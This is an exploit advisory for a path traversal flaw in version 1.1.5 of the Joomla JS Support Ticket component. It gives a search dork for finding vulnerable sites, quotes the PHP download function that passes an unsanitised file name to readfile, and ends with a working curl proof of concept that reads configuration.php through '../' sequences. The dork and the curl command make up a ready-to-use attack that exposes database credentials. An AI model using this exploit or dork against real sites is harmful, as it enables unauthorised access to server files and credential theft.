#Dork: inurl:"index.php?option=com_jssupportticket"
#Exploit Author: qw3rTyTy
#Vendor Homepage: http://joomsky.com/
#Software Link: https://www.joomsky.com/46/download/1.html
#Version: 1.1.5
#Tested on: Debian/nginx/joomla 3.9.0
#####################################
#Vulnerability details:
#####################################
Vulnerable code is in line 1411 in file admin/models/ticket.php

  1382	    function getDownloadAttachmentByName($file_name,$id){
  1383	        if(empty($file_name)) return false;
  1384	        if(!is_numeric($id)) return false;
  1385	        $db = JFactory::getDbo();
  1386	        $filename = str_replace(&#039; &#039;, &#039;_&#039;,$file_name);
  1387	        $query = "SELECT attachmentdir FROM `#__js_ticket_tickets` WHERE id = ".$id;
  1388	        $db->setQuery($query);
  1389	        $foldername = $db->loadResult();
  1390	
  1391	        $datadirectory = $this->getJSModel(&#039;config&#039;)->getConfigurationByName(&#039;data_directory&#039;);
  1392	        $base = JPATH_BASE;
  1393	        if(JFactory::getApplication()->isAdmin()){
  1394	            $base = substr($base, 0, strlen($base) - 14); //remove administrator    
  1395	        }  
  1396	        $path = $base.&#039;/&#039;.$datadirectory;
  1397	        $path = $path . &#039;/attachmentdata&#039;;
  1398	        $path = $path . &#039;/ticket/&#039; . $foldername;
  1399	        $file = $path . &#039;/&#039; . $filename;
  1400	
  1401	        header(&#039;Content-Description: File Transfer&#039;);
  1402	        header(&#039;Content-Type: application/octet-stream&#039;);
  1403	        header(&#039;Content-Disposition: attachment; filename=&#039; . basename($file));
  1404	        header(&#039;Content-Transfer-Encoding: binary&#039;);
  1405	        header(&#039;Expires: 0&#039;);
  1407	        header(&#039;Pragma: public&#039;);
  1408	        header(&#039;Content-Length: &#039; . filesize($file));
  1409	        //ob_clean();
  1410	        flush();
  1411	        readfile($file);		//!!!
  1412	        exit();
  1413	        exit;
  1414	    }

#####################################
#PoC:
#####################################
$> curl -X GET -i "http://localhost/index.php?option=com_jssupportticket&c=ticket&task=downloadbyname&id=0&name=../../../configuration.php"

